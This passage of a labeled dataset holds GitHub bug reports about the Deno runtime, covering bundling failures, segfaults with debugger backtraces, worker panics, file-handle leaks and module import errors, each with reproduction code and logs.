8000 });\r\nconsole.log(\"http://localhost:8000/\");\r\nfor await (const req of s) {\r\n  req.respond({ body: \"Hello World\\n\" });\r\n}\r\n\r\n// this is here to work around #4207\r\nawait console.log(\"test\");\r\n```\r\n\r\nRun `deno bundle server.js out.js`\r\n\r\nRun `deno out.js`\r\n\r\n## Expected result\r\n\r\nThe code is bundled correctly and runs\r\n\r\n## Actual result\r\n\r\n```sh\r\n$ deno bundle server.js out.js\r\nBundling \"file:///path/to/server.js\"\r\nEmitting bundle to \"out.js\"\r\n2.7 kB emitted.\r\n$ deno out.js\r\nerror: Uncaught TypeError: Cannot destructure property 'd' of 'mMap.get(...)' as it is undefined.\r\n► file:///path/to/out.js:45:17\r\n```\r\n\r\nThe bundle doesn't seem to be complete - it's missing the HTTP library.\r\n\r\n## Notes\r\n\r\nThis seems related to #4031 but adding `export {};` to the file doesn't fix the issue.\r\n\r\n```\r\ndeno 0.35.0\r\nv8 8.1.310\r\ntypescript 3.8.2\r\n```"},{"labels":["bug"],"text":"I get these on my PR, that do not seem to be related to code i pushed #4202  :\r\n```bash\r\nOK     fsEventsBasic (2.00ms)\r\n##[error]thread '<unnamed>' panicked at 'fs events error: SendError(Ok(FsEvent { kind: \"modify\", paths: [\"/tmp/8259b2ca/file2.txt\"] }))', src/libcore/result.rs:1188:5\r\n```"},{"labels":[null,"bug",null],"text":"Example:\r\nhttps://github.com/denoland/deno/pull/4173\r\n\r\n`http_bench.ts` errors out but benchmark CI step does not fail. \r\n\r\nhttps://github.com/denoland/deno/issues/4149\r\n\r\n`deno_tcp.ts` segfaults and yet the benchmark CI step does not fail. \r\n\r\nIf that was the case it could help us catch bugs described above faster.\r\n\r\nThis requires to change `run` function in `tools/http_benchmark.py` such that it check error code of spawned server and even better if it did one more request after benchmark is done to ensure that server is still alive."},{"labels":["bug"],"text":"The submodule of `https://cdn.pika.dev/fp-ts` contains header information, but the declaration file is not downloaded\r\n\r\n```json\r\n{\r\n  \"headers\": {\r\n    \"access-control-allow-origin\": \"*\",\r\n    \"cache-control\": \"no-store, no-cache\",\r\n    \"x-typescript-types\": \"/-/fp-ts@v2.5.3/dist=es2019/types/index.d.ts\",\r\n    \"x-ratelimit-remaining\": \"250\",\r\n    \"x-now-cache\": \"MISS\",\r\n    \"x-ratelimit-limit\": \"250\",\r\n    \"x-powered-by\": \"Express\",\r\n    \"server\": \"now\",\r\n    \"date\": \"Sat, 29 Feb 2020 12:11:55 GMT\",\r\n    \"strict-transport-security\": \"max-age=63072000\",\r\n    \"x-now-trace\": \"tpe1\",\r\n    \"content-type\": \"application/javascript; charset=utf-8\",\r\n    \"x-ratelimit-reset\": \"1582978500\",\r\n    \"x-now-id\": \"tpe1:sfo1:z6h2z-1582978315332-d57a553dae6d\",\r\n    \"etag\": \"W/\\\"4bf1b-Qscuf3Ki/CoTL8CDQWlVn5KGfTo\\\"\"\r\n  },\r\n  \"url\": \"https://cdn.pika.dev/-/fp-ts@v2.5.3/dist=es2019/fp-ts.js\"\r\n}\r\n```\r\n\r\n### Source Code\r\n\r\n```ts\r\nimport { array } from \"https://cdn.pika.dev/fp-ts\";\r\n\r\nconst M = array.getMonoid<number>();\r\nconsole.log(\"concat Array\", M.concat([1, 2], [2, 3]));\r\n```\r\n\r\n```shell\r\n$ deno -V\r\ndeno 0.35.0\r\n$ deno run mod.ts\r\n# or deno fetch mod.ts\r\n```"},{"labels":["bug"],"text":"I found that even format code error. It still exit with zero code.\r\n\r\n`0` exit code in Unix process means `Success`\r\n\r\nIs this intentional?\r\n\r\n```shell\r\n$ echo \"import { example }\" | deno fmt -\r\nError formatting from stdin\r\n   Line 1, column 21: Expected Word(from), got None\r\n```\r\n\r\n```bash\r\necho \"import { example }\" | deno fmt -\r\n# Because the previous script exit code was 0, this command will continue to run\r\n# Out of expect\r\nls -lh\r\nsomething-else\r\n```\r\n\r\nhttps://github.com/denoland/deno/blob/3eebef39c55ead92d17bdf8016c3c58118b49936/cli/fmt.rs#L178-L202"},{"labels":["bug"],"text":"```\r\n▶ target/release/deno --allow-net tools/deno_tcp.ts 127.0.0.1:4544\r\nListening on 127.0.0.1:4544\r\n[1]    32342 segmentation fault  target/release/deno --allow-net tools/deno_tcp.ts 127.0.0.1:4544\r\n```\r\n```\r\n▶ wrk -d 10 --latency http://127.0.0.1:4544\r\nRunning 10s test @ http://127.0.0.1:4544\r\n  2 threads and 10 connections\r\n  Thread Stats   Avg      Stdev     Max   +/- Stdev\r\n    Latency   548.03us    2.16ms  43.42ms   95.17%\r\n    Req/Sec    32.28k     3.29k   36.54k    81.50%\r\n  Latency Distribution\r\n     50%  132.00us\r\n     75%  138.00us\r\n     90%  208.00us\r\n     99%   10.05ms\r\n  642599 requests in 10.01s, 31.25MB read\r\nRequests/sec:  64198.13\r\nTransfer/sec:      3.12MB\r\n```\r\nOutput from `rust-lldb`\r\n```\r\n▶ rust-lldb target/release/deno --  --allow-net tools/deno_tcp.ts 127.0.0.1:4544\r\n(lldb) command script import \"/Users/biwanczuk/.rustup/toolchains/stable-x86_64-apple-darwin/lib/rustlib/etc/lldb_rust_formatters.py\"\r\n(lldb) type summary add --no-value --python-function lldb_rust_formatters.print_val -x \".*\" --category Rust\r\n(lldb) type category enable Rust\r\n(lldb) target create \"target/release/deno\"\r\nCurrent executable set to 'target/release/deno' (x86_64).\r\n(lldb) settings set -- target.run-args  \"--allow-net\" \"tools/deno_tcp.ts\" \"127.0.0.1:4544\"\r\n(lldb) r\r\nProcess 25595 launched: '/Users/biwanczuk/dev/deno/target/release/deno' (x86_64)\r\nListening on 127.0.0.1:4544\r\ndeno was compiled with optimization - stepping may behave oddly; variables may not be available.\r\nProcess 25595 stopped\r\n* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x20)\r\n    frame #0: 0x0000000100983850 deno`::~BackingStore() at backing-store.cc:197:16 [opt]\r\nTarget 0: (deno) stopped.\r\n(lldb) bt\r\n* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x20)\r\n  * frame #0: 0x0000000100983850 deno`::~BackingStore() at backing-store.cc:197:16 [opt]\r\n    frame #1: 0x0000000100726327 deno`::__on_zero_shared() [inlined] operator() at memory:2378:5 [opt]\r\n    frame #2: 0x000000010072631a deno`::__on_zero_shared() at memory:3551 [opt]\r\n    frame #3: 0x000000010070df87 deno`::std__shared_ptr__v8__BackingStore__reset() [inlined] __release_shared at memory:3455:9 [opt]\r\n    frame #4: 0x000000010070df7e deno`::std__shared_ptr__v8__BackingStore__reset() [inlined] __release_shared at memory:3497 [opt]\r\n    frame #5: 0x000000010070df7e deno`::std__shared_ptr__v8__BackingStore__reset() [inlined] ~shared_ptr at memory:4226 [opt]\r\n    frame #6: 0x000000010070df7e deno`::std__shared_ptr__v8__BackingStore__reset() [inlined] ~shared_ptr at memory:4224 [opt]\r\n    frame #7: 0x000000010070df7e deno`::std__shared_ptr__v8__BackingStore__reset() [inlined] reset at memory:4361 [opt]\r\n    frame #8: 0x000000010070df7e deno`::std__shared_ptr__v8__BackingStore__reset() at binding.cc:616 [opt]\r\n    frame #9: 0x000000010004ef1f deno`core::ptr::real_drop_in_place::he7e67422a199d39e + 15\r\n    frame #10: 0x000000010017aedb deno`core::ptr::real_drop_in_place::hbdfcceccbb97d59a + 43\r\n    frame #11: 0x000000010005bbc3 deno`core::ptr::real_drop_in_place::h00649f140172f629 + 19\r\n    frame #12: 0x00000001006e35c3 deno`core::ptr::real_drop_in_place::h746224c518aaf667 + 19\r\n    frame #13: 0x000000010013e578 deno`_$LT$futures_util..stream..futures_unordered..FuturesUnordered$LT$Fut$GT$$u20$as$u20$core..ops..drop..Drop$GT$::drop::h83ba73cdf6a6c66b + 168\r\n    frame #14: 0x0000000100177475 deno`core::ptr::real_drop_in_place::h6f2a5c2c19fa9d6c + 245\r\n    frame #15: 0x0000000100179191 deno`core::ptr::real_drop_in_place::h95854fbe06aad049 + 33\r\n    frame #16: 0x0000000100178ab9 deno`core::ptr::real_drop_in_place::h8f16570a666a4c5e (.llvm.7121938994333845487) + 41\r\n    frame #17: 0x00000001001a3095 deno`_$LT$std..future..GenFuture$LT$T$GT$$u20$as$u20$core..future..future..Future$GT$::poll::hef3e620d5c98d44b + 1301\r\n    frame #18: 0x000000010000f8ad deno`tokio::runtime::basic_scheduler::BasicScheduler$LT$P$GT$::block_on::h7a3583bb8574e0fe + 157\r\n    frame #19: 0x00000001000357a0 deno`tokio::runtime::context::enter::h18c96a494c77a009 + 176\r\n    frame #20: 0x00000001001f9eac deno`deno::tokio_util::run_basic::h99fc1fd901132822 + 124\r\n    frame #21: 0x000000010006a860 deno`deno::main::h795ed52523c79963 + 9488\r\n    frame #22: 0x0000000100000c06 deno`std::rt::lang_start::_$u7b$$u7b$closure$u7d$$u7d$::hdd71bd3eeba61916 + 6\r\n    frame #23: 0x00000001011a5578 deno`std::panicking::try::do_call::h77eb563f55a56484 [inlined] std::rt::lang_start_internal::_$u7b$$u7b$closure$u7d$$u7d$::h04f5bc1b8502155f at rt.rs:52:12 [opt]\r\n    frame #24: 0x00000001011a556c deno`std::panicking::try::do_call::h77eb563f55a56484 at panicking.rs:292 [opt]\r\n    frame #25: 0x00000001011afa5f deno`__rust_maybe_catch_panic at lib.rs:78:7 [opt]\r\n    frame #26: 0x00000001011a5e8e deno`std::rt::lang_start_internal::h3d261fac4b6382f2 [inlined] std::panicking::try::h989c79f60ffdf02a at panicking.rs:270:12 [opt]\r\n    frame #27: 0x00000001011a5e5b deno`std::rt::lang_start_internal::h3d261fac4b6382f2 [inlined] std::panic::catch_unwind::hd3f56528916c87b0 at panic.rs:394 [opt]\r\n    frame #28: 0x00000001011a5e5b deno`std::rt::lang_start_internal::h3d261fac4b6382f2 at rt.rs:51 [opt]\r\n    frame #29: 0x0000000100000bf9 deno`main + 41\r\n    frame #30: 0x00007fff71f82cc9 libdyld.dylib`start + 1\r\n    frame #31: 0x00007fff71f82cc9 libdyld.dylib`start + 1\r\n(lldb)\r\n```\r\n\r\nThis segfault happens only when running using `wrk` - I cannot trigger it using `nc`/`curl`\r\n\r\nI managed to get same segfault running `tools/deno_tcp.ts` using `deno v0.33.0`"},{"labels":["bug"],"text":"We need to call `set_virtual_terminal_processing` \r\n\r\nsee https://github.com/denoland/deno/pull/4106#pullrequestreview-363475270"},{"labels":["bug"],"text":"@seishun [reports](https://github.com/denoland/deno/pull/4010#issuecomment-590471108):\r\n\r\ntsconfig.json\r\n```json\r\n{\r\n  \"compilerOptions\": {\r\n    \"checkJs\": true,\r\n    \"allowJs\": true\r\n  }\r\n}\r\n```\r\nfoo.ts\r\n```ts\r\nimport \"./test.js\";\r\n```\r\ntest.js\r\n```js\r\nfunction define(foo) {}\r\ndefine([\"long\"]);\r\n```\r\n..\\deno\\target\\debug\\deno.exe --config tsconfig.json foo.ts\r\n```\r\nCompile file:///C:/Users/Nikolai/test-proj-delete/foo.ts\r\nerror: Uncaught URIError: relative import path \"long\" not prefixed with / or ./ or ../ Imported from \"file:///C:/Users/Nikolai/test-proj-delete/test.js\"\r\n```\r\n\r\nRef https://github.com/denoland/deno/pull/4040 https://github.com/denoland/deno/pull/4010\r\ncc @kitsonk "},{"labels":["bug"],"text":"Related to #3810 (see https://github.com/denoland/deno/pull/3810#issuecomment-580076434)\r\n\r\nmakeTempDir fails if `dir` option is specified with a relative path, and --allow-write permission uses a whitelist.\r\n\r\nI put together a [small example](https://github.com/Acerbic/deno_makedirtemp_bug_demo) of the buggy behavior."},{"labels":["bug"],"text":"On a mac:\r\n\r\n```\r\n> deno test bad_module.ts\r\nNo such file or directory (os error 2)\r\n```\r\n\r\nVersus:\r\n\r\n```\r\n> deno run bad_module.ts\r\nCannot resolve module \"file:///Users/kkelly/github/deno/bad_module.ts\"\r\n```\r\n\r\nThe `deno run` is far more informative and consistent across OSes.\r\n"},{"labels":["bug"],"text":"I have stumbled upon a race condition when attempting to close a Worker while a large `Message` is being sent; the following module reproduces the bug 100% of times on my machine:\r\n\r\n```typescript\r\n// worker.ts\r\nsetTimeout(() => {\r\n  console.log(\"timeout\");\r\n  close();\r\n}, 50);\r\nwhile (true) {\r\n  await new Promise(done => {\r\n    setTimeout(() => {\r\n      postMessage({ buf: new Uint8Array({ length: 999999 }) });\r\n      done();\r\n    });\r\n  });\r\n}\r\n```\r\n\r\n```shell\r\n$ deno --version\r\ndeno 0.34.0\r\nv8 8.1.108\r\ntypescript 3.7.2\r\n\r\n$ RUST_BACKTRACE=1 deno eval \"new Worker('./worker.ts',{type:'module'})\"\r\ntimeout\r\nthread 'deno-worker-USER-WORKER-./worker.ts' panicked at 'Failed to post message to host: SendError { kind: Disconnected }', src/libcore/result.rs:1188:5\r\nstack backtrace:\r\n   0: <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt\r\n   1: core::fmt::write\r\n   2: std::io::Write::write_fmt\r\n   3: std::panicking::default_hook::{{closure}}\r\n   4: std::panicking::default_hook\r\n   5: std::panicking::rust_panic_with_hook\r\n   6: rust_begin_unwind\r\n   7: core::panicking::panic_fmt\r\n   8: core::result::unwrap_failed\r\n   9: deno::ops::web_worker::op_worker_post_message\r\n  10: deno::state::State::core_op::{{closure}}\r\n  11: deno_core::ops::OpRegistry::call\r\n  12: deno_core::isolate::Isolate::dispatch_op\r\n  13: deno_core::bindings::send\r\n  14: <extern \"C\" fn(A0) .> R as rusty_v8::support::CFnFrom<F>>::mapping::c_fn\r\n  15: _ZN2v88internal25FunctionCallbackArguments4CallENS0_15CallHandlerInfoE\r\n  16: _ZN2v88internal12_GLOBAL__N_119HandleApiCallHelperILb0EEENS0_11MaybeHandleINS0_6ObjectEEEPNS0_7IsolateENS0_6HandleINS0_10HeapObjectEEESA_NS8_INS0_20FunctionTemplateInfoEEENS8_IS4_EENS0_16BuiltinArgumentsE\r\n  17: _ZN2v88internalL26Builtin_Impl_HandleApiCallENS0_16BuiltinArgumentsEPNS0_7IsolateE\r\nnote: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\r\nfatal runtime error: failed to initiate panic, error 5\r\n[1]    25457 abort      RUST_BACKTRACE=1 /usr/bin/deno eval \r\n```"},{"labels":["bug"],"text":"Experienced here https://github.com/denoland/deno/pull/4035/checks?check_run_id=457778529 but I've also seen elsewhere.\r\n\r\nI think it might be related to the changes to the test server in 2e7d449623b7faee8feb0a2970e0d6bb7c66b409. Or maybe the changes in e6167c78134182c45689bda7bcb12af05009349c."},{"labels":["bug"],"text":"```shell\r\n$ deno fetch https://cdn.pika.dev/date-fns\r\nDownload https://cdn.pika.dev/date-fns\r\nDownload https://cdn.pika.dev/-/date-fns@v2.9.0-si0G7GvbRjRynVZsHhan/dist=es2019/date-fns.js\r\n```\r\n\r\n```shell\r\n$ deno run mod.ts\r\nCompile file:///Users/name/gpm/github.com/axetroy/deno_dnx/mod.ts\r\nDownload https://cdn.pika.dev/date-fns\r\nDownload https://cdn.pika.dev/-/date-fns@v2.9.0-si0G7GvbRjRynVZsHhan/dist=es2019/date-fns.js\r\nDownload https://cdn.pika.dev/-/date-fns@v2.9.0-si0G7GvbRjRynVZsHhan/dist=es2019/types/index.d.ts\r\nDownload https://cdn.pika.dev/-/date-fns@v2.9.0-si0G7GvbRjRynVZsHhan/dist=es2019/types/index.d.ts\r\n```"},{"labels":["bug"],"text":"I simply run `file_server`, but it will start returning the error with 500 status.\r\n\r\ndeno 0.32.0\r\nv8 8.1.108\r\ntypescript 3.7.2\r\n\r\n```sh\r\ndeno run --allow-net --allow-read https://deno.land/std/http/file_server.ts .\r\n```\r\n\r\nThis is the my test case.\r\n```ts\r\nconst url = 'http://localhost:4500/public/index.html';\r\n\r\nlet count = 0;\r\n(async () => {\r\n  while (true) {\r\n    console.log('opening...', ++count);\r\n    const res = await fetch(url);\r\n    if (res.status !== 200) {\r\n      console.log('error!.', res.status);\r\n    } else {\r\n      console.log('opened.', res.status);\r\n    }\r\n  }\r\n})();\r\n```\r\nIf I increase `ulimit`, the error can be delayed, but it won't fix the issue.\r\n\r\nI have tested some cases, it seems files are not closed properly. \r\nIf I close files after returning responses, it won't cause the error. \r\n```sh\r\nasync function serveFile(req: ServerRequest, filePath: string) {\r\n  const [file, fileInfo] = await Promise.all([open(filePath), stat(filePath)]);\r\n  const headers = new Headers();\r\n  headers.set('content-length', fileInfo.len.toString());\r\n  headers.set('content-type', 'text/plain; charset=utf-8');\r\n\r\n  const res = {\r\n    status: 200,\r\n    body: file,\r\n    headers,\r\n  };\r\n  return res;\r\n}\r\n\r\nwindow.onload = async function main() {\r\n  const addr = '0.0.0.0:4500';\r\n  const server = serve(addr);\r\n  console.log(`HTTP server listening on http://${addr}/`);\r\n  for await (const req of server) {\r\n    const res = await serveFile(req, 'public/index.html');\r\n    await req.respond(res);\r\n    res.body.close(); // <- here\r\n  }\r\n};\r\n```\r\n\r\nhttps://github.com/suguru03/file-server-demo"},{"labels":["bug"],"text":"Full disclosure: I'm a complete Deno newbie. This is probably not a Deno bug but a bug in my understanding of how to import modules.\r\n\r\nI'm trying to import Lodash from https://deno.land/x/lodash_require/\r\n\r\n```typescript\r\nimport Lodash from \"https://deno.land/x/lodash_require/mod.ts\";\r\n\r\nconst words = [\"Hello\", \"World\"];\r\n\r\nLodash.forEach(words, (w: string) => {\r\n  console.log(w);\r\n});\r\n```\r\n\r\nWhen I run this:\r\n\r\n```\r\ndeno hello.ts\r\n```\r\n\r\nI get the following error:\r\n\r\n```\r\nD:\\deno>deno hello.ts\r\nCompile file:///D:/deno/hello.ts\r\nerror: Uncaught Error: Protocol has to be file://\r\n► module.ts:1199:11\r\n\r\n1199     throw new Error(\"Protocol has to be file://\");\r\n               ^\r\n    at fileURLToPath (module.ts:1199:11)\r\n    at createRequire (module.ts:514:18)\r\n    at mod.ts:4:18\r\n```"},{"labels":["bug",null],"text":"It makes sense why this is happening but I am not sure if this is desired behavior.\r\n\r\nFor instance: `deno program.ts \"$(cat file.yaml)\"` will parse as { \"-\": true }.\r\nIt appears to be assuming a flag of \"-\" and then because nothing is attached to stdin it just returns true. It would be better if text that starts with \"---\\n\" ends in the \"_\" array. I can't imagine a situation where one would want an argument named \"-\"."},{"labels":["bug"],"text":"```\r\n> deno -V\r\ndeno 0.32.0\r\n> deno types  | head\r\n// Copyright 2018-2020 the Deno authors. All rights reserved. MIT license.\r\n\r\n/// <reference no-default-lib=\"true\" />\r\n/// <reference lib=\"esnext\" />\r\n\r\ndeclare namespace Deno {\r\n  /** The current process id of the runtime. */\r\n  export let pid: number;\r\n\r\n  /** Reflects the NO_COLOR environment variable: https://no-color.org/ */\r\nthread 'main' panicked at 'failed printing to stdout: Broken pipe (os error 32)', src/libstd/io/stdio.rs:792:9\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace.\r\n```"},{"labels":["bug"],"text":"I tried to resolve this bug on the glitter channel, and was told it worked fine on other systems that are not using PNPM:\r\n\r\n> sounds like an edge case with hard links where only one is being followed. npm doesn't use hard links like pnpm as far as I know. Probably worth filing an issue.\r\n\r\nSo just make a directory with these two files in, have https://github.com/pnpm/pnpm installed and type `pnpm install` then `deno -A rules.ts`\r\n\r\nrules.ts\r\n```\r\nimport { createRequire } from 'https://deno.land/std@v0.31.0/node/module.ts';\r\nconst denoRequire = createRequire(import.meta.url);\r\n\r\nconst test2 = denoRequire(\r\n  './node_modules/@typescript-eslint/eslint-plugin/dist/configs/eslint-recommended.js'\r\n);\r\nconsole.log(JSON.stringify(test2));\r\n\r\nconst test1 = denoRequire(\r\n  './node_modules/eslint-config-airbnb-typescript/base.js'\r\n);\r\nconsole.log(JSON.stringify(test1));\r\n```\r\npackage.json\r\n```\r\n{\r\n  \"name\": \"deno-test\",\r\n  \"version\": \"1.0.0\",\r\n  \"description\": \"\",\r\n  \"main\": \"index.js\",\r\n  \"keywords\": [],\r\n  \"author\": \"\",\r\n  \"license\": \"ISC\",\r\n  \"devDependencies\": {\r\n    \"@typescript-eslint/eslint-plugin\": \"^2.18.0\",\r\n    \"@typescript-eslint/parser\": \"^2.18.0\",\r\n    \"eslint\": \"^6.8.0\",\r\n    \"eslint-config-airbnb-typescript\": \"^6.3.1\",\r\n    \"eslint-plugin-import\": \"^2.20.1\",\r\n    \"typescript\": \"^3.7.5\"\r\n  }\r\n}\r\n```\r\nError:\r\n```\r\ndeno -A rules.ts \r\nCompile file:///home/david/Downloads/denobug/rules.ts\r\n{\"default\":{\"overrides\":[{\"files\":[\"*.ts\",\"*.tsx\"],\"rules\":{\"getter-return\":\"off\",\"no-dupe-args\":\"off\",\"no-dupe-keys\":\"off\",\"no-unreachable\":\"off\",\"valid-typeof\":\"off\",\"no-const-a\r\nssign\":\"off\",\"no-new-symbol\":\"off\",\"no-this-before-super\":\"off\",\"no-undef\":\"off\",\"no-dupe-class-members\":\"off\",\"no-redeclare\":\"off\"}}]}}\r\nerror: Uncaught Error: Cannot find module 'eslint-config-airbnb-base'\r\nRequire stack:\r\n- /home/david/Downloads/denobug/node_modules/eslint-config-airbnb-typescript/base.js\r\n- /home/david/Downloads/denobug/rules.ts\r\n► module.ts:255:19\r\n\r\n255       const err = new Error(message);\r\n                      ^\r\n\r\n    at _resolveFilename (module.ts:255:19)\r\n    at resolve (module.ts:1105:19)\r\n    at <unknown>:2:61\r\n    at _compile (module.ts:151:36)\r\n    at Module._extensions..js (module.ts:1051:10)\r\n    at load (module.ts:130:34)\r\n    at _load (module.ts:392:14)\r\n    at require (module.ts:116:21)\r\n    at require (module.ts:1101:16)\r\n    at rules.ts:9:15\r\n```\r\nmy system:\r\n```\r\nlinux: centos8\r\n\r\ndeno 0.31.0\r\nv8 8.1.108\r\ntypescript 3.7.2\r\n```\r\n\r\n"},{"labels":["bug"],"text":"Trying to import any library trough jspm.io like so:\r\n```typescript\r\nimport jsdom from 'https://dev.jspm.io/jsdom'\r\n```\r\nAlways returns either error code 123 \"The filename, directory name, or volume label syntax is incorrect\", error code 267 \"invalid directory name\" or error 5 \"Permission Denied\"\r\n```bash\r\n$ deno -A --reload mod.ts\r\n```\r\n<details>\r\n<summary>output</summary>\r\n\r\n```bash\r\nCompile file:///D:/Projects/js/deno-test/mod.ts\r\nDownload https://dev.jspm.io/jsdom\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/api.dew.js\r\nDownload https://dev.jspm.io/npm:@jspm/core@1/nodelibs/path.js\r\nDownload https://dev.jspm.io/npm:@jspm/core@1/nodelibs/@empty.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/vm-shim.dew.js\r\nDownload https://dev.jspm.io/npm:tough-cookie@3?dew\r\nDownload https://dev.jspm.io/npm:html-encoding-sniffer@2?dew\r\nDownload https://dev.jspm.io/npm:whatwg-url@8?dew\r\nDownload https://dev.jspm.io/npm:whatwg-encoding@1?dew\r\nDownload https://dev.jspm.io/npm:whatwg-mimetype@2?dew\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/utils.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/virtual-console.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/browser/Window.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/browser/parser/index.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/domparsing/serialization.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/browser/resources/resource-loader.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/browser/resources/no-op-resource-loader.dew.js\r\nDownload https://dev.jspm.io/npm:@jspm/core@1/nodelibs/buffer.js\r\nDownload https://dev.jspm.io/npm:acorn@7?dew\r\nDownload https://dev.jspm.io/npm:acorn-globals@4?dew\r\nDownload https://dev.jspm.io/npm:escodegen@1?dew\r\nDownload https://dev.jspm.io/npm:@jspm/core@1/nodelibs/events.js\r\nDownload https://dev.jspm.io/npm:webidl-conversions@5?dew\r\nDownload https://dev.jspm.io/npm:cssstyle@2?dew\r\nDownload https://dev.jspm.io/npm:w3c-hr-time@1?dew\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/browser/not-implemented.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/utils.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/Element.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/EventTarget.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/PageTransitionEvent.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/named-properties-window.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/post-message.dew.js\r\nDownload https://dev.jspm.io/npm:domexception@2/webidl2js-wrapper?dew\r\nDownload https://dev.jspm.io/npm:abab@2?dew\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/websockets/WebSocket-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/BarProp.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/Document.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/External.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/Navigator.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/Performance.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/Screen.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/Storage.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/Selection.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/runtime-script-errors.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/events.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/window/SessionHistory.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/style-rules.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/browser/js-globals.json.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/GlobalEventHandlers-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/WindowEventHandlers-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/interfaces.dew.js\r\nDownload https://dev.jspm.io/npm:@jspm/core@1/nodelibs/process.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/internal-constants.dew.js\r\nDownload https://dev.jspm.io/npm:symbol-tree@3?dew\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/document-base-url.dew.js\r\nDownload https://dev.jspm.io/npm:canvas@2?dew\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/Attr.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/ShadowRootInit.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/Node.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/Element-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/attributes/Attr-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/attributes.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/strings.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/namespaces.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/mutation-observers.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/Event.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/MutationRecord.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/EventInit.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/events/Event-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/mutation-observer/MutationRecord-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/NodeList.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/NodeList-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/ShadowRootMode.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/GetRootNodeOptions.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/Node-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/events/EventTarget-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/node-type.dew.js\r\nDownload 